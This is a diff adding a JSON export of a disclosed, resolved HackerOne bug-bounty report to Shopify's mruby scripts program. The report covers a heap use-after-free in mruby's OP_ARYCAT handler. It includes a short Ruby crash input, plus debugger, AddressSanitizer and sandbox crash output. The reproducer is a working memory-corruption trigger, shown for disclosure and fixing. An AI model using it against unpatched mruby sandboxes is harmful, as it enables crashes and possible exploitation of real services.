@@ -1,0 +1,110 @@
+{
+  "id": 184715,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQ3MTU=",
+  "url": "https://hackerone.com/reports/184715",
+  "title": "Read after free in mrb_vm_exec with OP_ARYCAT reading R(B)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-24T05:13:55.083Z",
+  "submitted_at": "2016-11-24T05:13:55.083Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haquaman",
+    "url": "/haquaman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-18T13:21:03.938Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-17T20:10:38.622Z",
+  "team_member_agreed_on_going_public_at": "2016-12-18T13:21:03.903Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nSlightly different one, this is a use after free (as reported by an ASAN compiled binary). This one *doesn't* affect mruby-engine with the current instruction limit and memory limit, but if they are increased then it does.\n\nThe file is:\n\n```\nclass Klazz\n  def $thing.name\n    f@thing.f@thing.name *nil\n  end\n  f$thing.name\nend\n```\n\n```\n$ ./dev/bin/mruby --version\nmruby 1.2.0 (2015-11-17)\n```\n\n```\n$ ./dev/bin/mruby crash.rb\ncrash.rb:3:22: '*' interpreted as argument prefix\nSegmentation fault: 11\n```\n\n```\n$ lldb ./dev/bin/mruby crash.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 36164 launched: './dev/bin/mruby' (x86_64)\ncrash.rb:3:22: '*' interpreted as argument prefix\nProcess 36164 stopped\n* thread #1: tid = 0x658c922, 0x000000010004261f mruby`mrb_vm_exec + 25407, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)\n    frame #0: 0x000000010004261f mruby`mrb_vm_exec + 25407\nmruby`mrb_vm_exec:\n->  0x10004261f <+25407>: movq   (%rax), %rsi\n    0x100042622 <+25410>: movl   0x8(%rax), %edx\n    0x100042625 <+25413>: movq   -0x6b8(%rbp), %rcx\n    0x10004262c <+25420>: movl   -0x6b0(%rbp), %r8d\n(lldb) bt\n* thread #1: tid = 0x658c922, 0x000000010004261f mruby`mrb_vm_exec + 25407, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)\n  * frame #0: 0x000000010004261f mruby`mrb_vm_exec + 25407\n    frame #1: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n    frame #2: 0x00000001000446b4 mruby`mrb_top_run + 100\n    frame #3: 0x000000010006f19f mruby`load_exec + 1183\n    frame #4: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n    frame #5: 0x0000000100000d78 mruby`main + 904\n    frame #6: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n    frame #7: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x00000001001fffc0\n       rbx = 0x0000000000000000\n       rcx = 0x0000000000000003\n       rdx = 0x000000000000000e\n       rdi = 0x4600441232bbc5a0\n       rsi = 0x00007fff7cda1070  __stack_chk_guard\n       rbp = 0x00007fff5fbfd670\n       rsp = 0x00007fff5fbfca40\n        r8 = 0x0000000000000100\n        r9 = 0x000000000000010e\n       r10 = 0x0000000000000000\n       r11 = 0x00000000007a06a0\n       r12 = 0x0000000000000000\n       r13 = 0x0000000000000000\n       r14 = 0x0000000000000000\n       r15 = 0x0000000000000000\n       rip = 0x000000010004261f  mruby`mrb_vm_exec + 25407\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n```\n\nOne with some symbols compiled in:\n\n```\n$ lldb ./bin/mruby ./crash.rb\n(lldb) target create \"./bin/mruby\"\nCurrent executable set to './bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"./crash.rb\"\n(lldb) r\nProcess 56454 launched: './bin/mruby' (x86_64)\n../crash.rb:3:22: '*' interpreted as argument prefix\nProcess 56454 stopped\n* thread #1: tid = 0x6591a7c, 0x000000010004437f mruby`mrb_vm_exec(mrb=0x0000000100300390, proc=0x0000000101004ee0, pc=0x000000010030f4d8) + 25407 at vm.c:2137, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)\n    frame #0: 0x000000010004437f mruby`mrb_vm_exec(mrb=0x0000000100300390, proc=0x0000000101004ee0, pc=0x000000010030f4d8) + 25407 at vm.c:2137\n   2134\n   2135     CASE(OP_ARYCAT) {\n   2136       /* A B            mrb_ary_concat(R(A),R(B)) */\n-> 2137       mrb_ary_concat(mrb, regs[GETARG_A(i)],\n   2138                      mrb_ary_splat(mrb, regs[GETARG_B(i)]));\n   2139       ARENA_RESTORE(mrb, ai);\n   2140       NEXT;\n(lldb) \n```\n\nOn a linux system with ASAN compiled:\n\n```\ncrash.rb:3:22: '*' interpreted as argument prefix\n=================================================================\n==4694==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e840 at pc 0x00000050f129 bp 0x7ffcfbabee30 sp 0x7ffcfbabee28\nREAD of size 8 at 0x61d00001e840 thread T0\n    #0 0x50f128 in mrb_vm_exec /root/mruby/src/vm.c:2137:7\n    #1 0x510d28 in mrb_vm_run /root/mruby/src/vm.c:766:10\n    #2 0x510d28 in mrb_top_run /root/mruby/src/vm.c:2452\n    #3 0x5bda14 in load_exec /root/mruby/mrbgems/mruby-compiler/core/parse.y:5716:7\n    #4 0x4e4211 in main /root/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:226:9\n    #5 0x7efd15fe6ec4 in __libc_start_main /build/eglibc-3GlaMS/eglibc-2.19/csu/libc-start.c:287\n    #6 0x43d146 in _start (/root/mruby/bin/mruby+0x43d146)\n\n0x61d00001e840 is located 1984 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)\nfreed by thread T0 here:\n    #0 0x4c4445 in realloc (/root/mruby/bin/mruby+0x4c4445)\n    #1 0x517e6d in mrb_default_allocf /root/mruby/src/state.c:60:12\n\npreviously allocated by thread T0 here:\n    #0 0x4c4445 in realloc (/root/mruby/bin/mruby+0x4c4445)\n    #1 0x517e6d in mrb_default_allocf /root/mruby/src/state.c:60:12\n\nSUMMARY: AddressSanitizer: heap-use-after-free /root/mruby/src/vm.c:2137 mrb_vm_exec\nShadow bytes around the buggy address:\n  0x0c3a7fffbcb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fffbcc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fffbcd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fffbce0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fffbcf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n=>0x0c3a7fffbd00: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd\n  0x0c3a7fffbd10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Heap right redzone:      fb\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack partial redzone:   f4\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==4694==ABORTING\n```\n\nNow this affects mruby-engine *ONLY IF* the resource limits are increased. I increased `REASONABLE_MEMORY_QUOTA` from `4MB` to `22MB`, and `REASONABLE_INSTRUCTION_QUOTA` from `100,000` to `525,000`. This then crashes:\n\n```\n./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000027\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon't forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:0016a8 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001880 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `<main>'\n./bin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n rax: 0x000000010eb18450 rbx: 0x0000000000000050 rcx: 0x0000000000000042\n rdx: 0x00000001100dac60 rdi: 0x000000010eb10440 rsi: 0x000000010eb75d08\n rbp: 0x00007fff51b3c1f0 rsp: 0x00007fff51b3c180  r8: 0x0000000000000004\n  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x000000000000020e\n r12: 0x000000010f332f40 r13: 0x000000000000001f r14: 0x0000000000000001\n r15: 0x000000010eb75d08 rip: 0x000000010e9f2683 rfl: 0x0000000000010213\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x000000010e2605d4 rb_vm_bugreport + 388\n1   ruby                                0x000000010e102023 rb_bug_context + 483\n2   ruby                                0x000000010e1d5653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   mruby_engine.bundle                 0x000000010e9f2683 each_backtrace + 211\n5   ???                                 0x000000010eb70620 0x0 + 4541842976\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n<snip various gems>\n  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\n```\n\nI'm not sure on a patch for this off the top of my head, but I'll think of one in the next day or so if you don't get to it first :).\n\nCheers,\n\nHugh",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-16T20:10:38.654Z",
+  "allow_singular_disclosure_after": -223229861.48818672,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "pekafat",
+    "eveeez",
+    "c1231665",
+    "japz",
+    "spetr0x",
+    "sanjaynaruka0611",
+    "visto",
+    "xcom"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
